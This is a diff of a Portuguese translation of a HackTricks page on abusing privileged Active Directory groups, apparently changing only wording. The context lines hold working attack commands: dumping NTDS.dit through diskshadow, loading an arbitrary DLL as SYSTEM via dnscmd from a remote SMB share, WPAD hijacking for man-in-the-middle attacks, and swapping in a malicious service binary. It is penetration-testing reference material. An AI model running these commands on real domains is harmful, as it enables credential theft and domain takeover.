@@ -10,7 +10,7 @@ Outras formas de apoiar o HackTricks:
 * Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
 * **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -27,7 +27,7 @@ Existem outras associações de contas e privilégios de token de acesso que tam
 * Permite criar contas e grupos não administradores no domínio
 * Permite fazer login localmente no DC
 
-Obter **membros** do grupo:
+Obtenha **membros** do grupo:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
@@ -45,9 +45,9 @@ Assim como fazer login localmente no DC01:
 
 ## Grupo AdminSDHolder
 
-A Lista de Controle de Acesso (ACL) do objeto **AdminSDHolder** é usada como um modelo para **copiar** **permissões** para **todos os "grupos protegidos"** no Active Directory e seus membros. Grupos protegidos incluem grupos privilegiados como Domain Admins, Administrators, Enterprise Admins e Schema Admins.\
-Por padrão, a ACL deste grupo é copiada para dentro de todos os "grupos protegidos". Isso é feito para evitar mudanças intencionais ou acidentais nesses grupos críticos. No entanto, se um atacante modificar a ACL do grupo **AdminSDHolder**, por exemplo, concedendo permissões completas a um usuário comum, esse usuário terá permissões completas em todos os grupos dentro do grupo protegido (em uma hora).\
-E se alguém tentar excluir esse usuário dos Domain Admins (por exemplo) em uma hora ou menos, o usuário estará de volta ao grupo.
+A Lista de Controle de Acesso (ACL) do objeto **AdminSDHolder** é usada como um modelo para **copiar** **permissões** para **todos os "grupos protegidos"** no Active Directory e seus membros. Grupos protegidos incluem grupos privilegiados como Admins do Domínio, Administradores, Admins da Empresa e Admins do Esquema.\
+Por padrão, a ACL deste grupo é copiada dentro de todos os "grupos protegidos". Isso é feito para evitar alterações intencionais ou acidentais nesses grupos críticos. No entanto, se um atacante modificar a ACL do grupo **AdminSDHolder**, por exemplo, concedendo permissões completas a um usuário comum, esse usuário terá permissões completas em todos os grupos dentro do grupo protegido (em uma hora).\
+E se alguém tentar excluir esse usuário dos Admins do Domínio (por exemplo) em uma hora ou menos, o usuário estará de volta ao grupo.
 
 Obter **membros** do grupo:
 ```powershell
@@ -75,7 +75,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 ### Acesso ao Controlador de Domínio
 
-Observe como não podemos acessar arquivos no DC com a atual associação:
+Note como não podemos acessar arquivos no DC com a atual associação:
 
 ![](../../.gitbook/assets/a4.png)
 
@@ -102,8 +102,7 @@ Sysinternals - www.sysinternals.com
 [ALLOW] BUILTIN\Server Operators
 All
 ```
-```markdown
-Isso confirma que o grupo Server Operators possui o direito de acesso [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), o que nos dá controle total sobre este serviço.
+Isso confirma que o grupo Server Operators tem o direito de acesso [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), o que nos dá controle total sobre este serviço.
 Você pode abusar deste serviço para [**fazer o serviço executar comandos arbitrários**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) e escalar privilégios.
 
 ## Backup Operators <a href="#backup-operators" id="backup-operators"></a>
@@ -115,7 +114,6 @@ Isso ocorre porque este grupo concede aos seus **membros** os privilégios [**`S
 Para esse propósito, você pode usar [**esses scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**
 
 Obter **membros** do grupo:
-```
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
@@ -140,11 +138,11 @@ Por exemplo, você pode acessar diretamente o sistema de arquivos do Controlador
 
 ![](../../.gitbook/assets/a7.png)
 
-Você pode abusar desse acesso para **roubar** o banco de dados do diretório ativo **`NTDS.dit`** para obter todos os **hashes NTLM** para todos os objetos de usuário e computador no domínio.
+Você pode abusar desse acesso para **roubar** o banco de dados do diretório ativo **`NTDS.dit`** para obter todos os **hashes NTLM** de todos os objetos de usuário e computador no domínio.
 
 #### Usando diskshadow.exe para despejar NTDS.dit
 
-Usando [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) você pode **criar uma cópia de sombra** do **drive `C`** e no drive `F`, por exemplo. Então, você pode roubar o arquivo `NTDS.dit` dessa cópia de sombra, pois ele não estará em uso pelo sistema:
+Usando [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), você pode **criar uma cópia de sombra** do **drive `C`** e no drive `F`, por exemplo. Então, você pode roubar o arquivo `NTDS.dit` dessa cópia de sombra, pois ele não estará em uso pelo sistema:
 ```
 diskshadow.exe
 
@@ -163,7 +161,7 @@ DISKSHADOW> expose %cdrive% F:
 DISKSHADOW> end backup
 DISKSHADOW> exit
 ```
-Como no ataque local, agora você pode copiar o arquivo privilegiado **`NTDS.dit`**:
+Assim como no ataque local, agora você pode copiar o arquivo privilegiado **`NTDS.dit`**:
 ```
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
@@ -213,7 +211,7 @@ Se for bem-sucedido, ele fará o dump em `C:\ntds.dit`.
 ## DnsAdmins
 
 Um usuário que é membro do grupo **DNSAdmins** ou tem **privilégios de escrita em um objeto de servidor DNS** pode carregar uma **DLL arbitrária** com privilégios de **SYSTEM** no **servidor DNS**.\
-Isso é muito interessante, pois os **Controladores de Domínio** são **usados** com muita frequência como **servidores DNS**.
+Isso é realmente interessante, pois os **Controladores de Domínio** são **usados** com muita frequência como **servidores DNS**.
 
 Como mostrado neste \*\*\*\* [**post**](https://adsecurity.org/?p=4064), o seguinte ataque pode ser realizado quando o DNS é executado em um Controlador de Domínio (o que é muito comum):
 
@@ -229,7 +227,7 @@ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### Executar DLL arbitrária
 
-Então, se você tem um usuário dentro do grupo **DNSAdmins**, você pode fazer o **servidor DNS carregar uma DLL arbitrária com privilégios de SYSTEM** (o serviço DNS é executado como `NT AUTHORITY\SYSTEM`). Você pode fazer o servidor DNS carregar um arquivo DLL **local ou remoto** (compartilhado por SMB) executando:
+Então, se você tem um usuário dentro do grupo **DNSAdmins**, você pode fazer o **servidor DNS carregar uma DLL arbitrária com privilégios de SYSTEM** (o serviço DNS roda como `NT AUTHORITY\SYSTEM`). Você pode fazer o servidor DNS carregar um arquivo DLL **local ou remoto** (compartilhado por SMB) executando:
 ```
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -261,9 +259,9 @@ Como detalhado neste [**post**](http://www.labofapenetrationtester.com/2017/05/a
 
 ### Registro WPAD para MitM
 
-Outra maneira de **abusar dos privilégios do grupo DnsAdmins** é criando um **registro WPAD**. A pertença a este grupo nos dá o direito de [desativar a segurança de bloqueio de consulta global](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), que por padrão bloqueia esse ataque. O Server 2008 introduziu pela primeira vez a capacidade de adicionar a uma lista de bloqueio de consulta global em um servidor DNS. Por padrão, o Web Proxy Automatic Discovery Protocol (WPAD) e o Intra-site Automatic Tunnel Addressing Protocol (ISATAP) estão na lista de bloqueio de consulta global. Esses protocolos são bastante vulneráveis a sequestros, e qualquer usuário do domínio pode criar um objeto de computador ou registro DNS contendo esses nomes.
+Outra maneira de **abusar dos privilégios do grupo DnsAdmins** é criando um **registro WPAD**. A pertença a este grupo nos dá o direito de [desativar a segurança de bloqueio de consulta global](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), que por padrão bloqueia esse ataque. O Server 2008 introduziu pela primeira vez a capacidade de adicionar à lista de bloqueio de consulta global em um servidor DNS. Por padrão, o Protocolo de Descoberta Automática de Proxy da Web (WPAD) e o Protocolo de Endereçamento Automático de Túnel Intra-site (ISATAP) estão na lista de bloqueio de consulta global. Esses protocolos são bastante vulneráveis a sequestros, e qualquer usuário do domínio pode criar um objeto de computador ou registro DNS contendo esses nomes.
 
-Após **desativar a lista de bloqueio de consulta global** e criar um **registro WPAD**, **cada máquina** executando WPAD com configurações padrão terá seu **tráfego intermediado através de nossa máquina de ataque**. Poderíamos usar uma ferramenta como \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **ou** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **para realizar spoofing de tráfego**, e tentar capturar hashes de senhas e quebrá-las offline ou realizar um ataque SMBRelay.
+Após **desativar a lista de bloqueio de consulta global** e criar um **registro WPAD**, **cada máquina** executando WPAD com configurações padrão terá seu **tráfego direcionado através de nossa máquina de ataque**. Poderíamos usar uma ferramenta como [**Responder**](https://github.com/lgandx/Responder) **ou** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **para realizar spoofing de tráfego**, e tentar capturar hashes de senhas e quebrá-las offline ou realizar um ataque SMBRelay.
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
@@ -271,7 +269,7 @@ Após **desativar a lista de bloqueio de consulta global** e criar um **registro
 
 ## Leitores de Log de Eventos
 
-Membros do grupo [**Leitores de Log de Eventos**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* têm **permissão para acessar os logs de eventos** gerados (como os logs de criação de novos processos). Nos logs, **informações sensíveis** podem ser encontradas. Vamos ver como visualizar os logs:
+Membros do grupo [**Leitores de Log de Eventos**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* têm **permissão para acessar os logs de eventos** gerados (como os logs de criação de novos processos). Nos logs, **informações sensíveis** podem ser encontradas. Vejamos como visualizar os logs:
 ```powershell
 #Get members of the group
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -287,7 +285,7 @@ Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -an
 ```
 ## Permissões do Exchange no Windows
 
-Membros recebem a capacidade de **escrever uma DACL no objeto de domínio**. Um atacante poderia abusar disso para **conceder a um usuário** [**DCSync**](dcsync.md) privilégios.\
+Membros recebem a capacidade de **escrever uma DACL no objeto do domínio**. Um atacante poderia abusar disso para **dar a um usuário** [**DCSync**](dcsync.md) privilégios.\
 Se o Microsoft Exchange estiver instalado no ambiente AD, é comum encontrar contas de usuários e até computadores como membros deste grupo.
 
 Este [**repositório GitHub**](https://github.com/gdedrouas/Exchange-AD-Privesc) explica algumas **técnicas** para **escalar privilégios** abusando das permissões deste grupo.
@@ -317,7 +315,7 @@ C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanc
 ```
 #### **Iniciando o Mozilla Maintenance Service**
 
-Em seguida, podemos substituir este arquivo por um **malicious `maintenanceservice.exe`**, **iniciar** o serviço de manutenção e obter execução de comandos como SYSTEM.
+Em seguida, podemos substituir este arquivo por um **malicioso `maintenanceservice.exe`**, **iniciar** o serviço de manutenção e obter execução de comandos como SYSTEM.
 ```
 C:\htb> sc.exe start MozillaMaintenance
 ```
